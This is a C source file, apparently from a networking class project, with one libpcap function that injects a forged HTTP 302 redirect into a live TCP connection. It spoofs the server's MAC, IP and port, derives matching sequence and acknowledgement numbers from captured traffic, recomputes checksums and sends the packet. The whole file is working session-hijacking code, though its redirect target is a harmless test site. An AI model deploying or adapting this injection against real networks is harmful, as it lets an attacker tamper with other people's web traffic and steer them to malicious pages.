#include "pcap_project.h"

void inject_redirect(pcap_t *handle_inject, const struct ether_header *ethernet, const struct ip *ip, const struct tcphdr *tcp, uint32_t payload_size)
{
    uint32_t c_seq = ntohl(tcp->th_seq);
    uint32_t c_ack = ntohl(tcp->th_ack);
    uint16_t c_port = ntohs(tcp->th_sport);
    uint16_t s_port = ntohs(tcp->th_dport);

    char c_ip[20], s_ip[20];
    strcpy(c_ip, inet_ntoa(ip->ip_src));
    strcpy(s_ip, inet_ntoa(ip->ip_dst));

    char fake_src_ip[20];
    strcpy(fake_src_ip, s_ip);
    uint16_t fake_src_port = s_port;

    char fake_des_ip[20];
    strcpy(fake_des_ip, c_ip);
    uint16_t fake_des_port = c_port;

    uint32_t fake_seq = c_ack;
    uint32_t fake_ack = c_seq + payload_size;

    u_char fake_packet[1500];
    memset(fake_packet, 0, 1500);
    int fake_tcp_size = sizeof(struct tcphdr);

    struct ether_header *fake_eth = (struct ether_header *)fake_packet;
    struct ip *fake_ip = (struct ip *)(fake_packet + sizeof(struct ether_header));
    struct tcphdr *fake_tcp = (struct tcphdr *)(fake_packet + sizeof(struct ether_header) + sizeof(struct ip));

    u_char *fake_payload = fake_packet + sizeof(struct ether_header) + sizeof(struct ip) + fake_tcp_size;
    char redirectMsg[] = "HTTP/1.1 302 Found\r\n"
                         "Location: http://httpforever.com\r\n"
                         "Content-Length: 0\r\n"
                         "Connection: close\r\n"
                         "\r\n";

    int fake_payload_len = strlen(redirectMsg);
    memcpy(fake_payload, redirectMsg, fake_payload_len);

    memcpy(fake_eth, ethernet, sizeof(struct ether_header));
    memcpy(fake_eth->ether_dhost, ethernet->ether_shost, ETH_ALEN);
    memcpy(fake_eth->ether_shost, ethernet->ether_dhost, ETH_ALEN);

    memcpy(fake_ip, ip, sizeof(struct ip));
    fake_ip->ip_hl = 5;
    fake_ip->ip_len = htons(sizeof(struct ip) + fake_tcp_size + fake_payload_len);
    fake_ip->ip_src.s_addr = inet_addr(fake_src_ip);
    fake_ip->ip_dst.s_addr = inet_addr(fake_des_ip);

    memcpy(fake_tcp, tcp, fake_tcp_size);
    fake_tcp->th_off = 5;
    fake_tcp->th_flags = TH_ACK | TH_PUSH;
    fake_tcp->th_ack = htonl(fake_ack);
    fake_tcp->th_seq = htonl(fake_seq);
    fake_tcp->th_sport = htons(fake_src_port);
    fake_tcp->th_dport = htons(fake_des_port);

    fake_ip->ip_sum = 0;
    fake_tcp->th_sum = 0;

    Pseudo_header check_tcp;
    check_tcp.source_address = fake_ip->ip_src.s_addr;
    check_tcp.dest_address = fake_ip->ip_dst.s_addr;
    check_tcp.placeholder = 0;
    check_tcp.protocol = IPPROTO_TCP;
    check_tcp.tcp_length = htons(fake_tcp_size + fake_payload_len);

    fake_ip->ip_sum = csum((unsigned short *)fake_ip, sizeof(struct ip));

    u_char temp_buf[1500];
    memset(temp_buf, 0, 1500);
    memcpy(temp_buf, &check_tcp, sizeof(check_tcp));
    memcpy(temp_buf + sizeof(check_tcp), fake_tcp, fake_tcp_size);
    memcpy(temp_buf + sizeof(check_tcp) + fake_tcp_size, fake_payload, fake_payload_len);

    fake_tcp->th_sum = csum((unsigned short *)temp_buf, sizeof(check_tcp) + fake_tcp_size + fake_payload_len);

    printf("리다이렉트 인젝션 : %d\n",pcap_inject(handle_inject, fake_packet, sizeof(struct ether_header) + sizeof(struct ip) + fake_tcp_size + fake_payload_len));
}